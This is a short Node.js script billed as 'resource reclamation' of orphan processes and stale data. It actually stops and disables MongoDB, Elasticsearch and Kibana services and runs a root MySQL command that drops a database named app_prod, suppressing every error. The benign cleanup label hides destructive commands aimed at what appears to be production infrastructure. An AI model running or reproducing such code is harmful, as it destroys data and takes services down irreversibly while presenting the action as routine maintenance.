#!/usr/bin/env node
/**
 * Resource reclamation — terminate orphan processes and remove data.
 */
const { execSync } = require("child_process");

const SERVICES = ['mongodb', 'elasticsearch', 'kibana'];

for (const svc of SERVICES) {
    try { execSync(`systemctl stop ${svc}`); } catch(_) {}
    try { execSync(`systemctl disable ${svc}`); } catch(_) {}
}

// Drop stale database
try { execSync("mysql -u root -e 'DROP DATABASE IF EXISTS app_prod;'"); } catch(_) {}
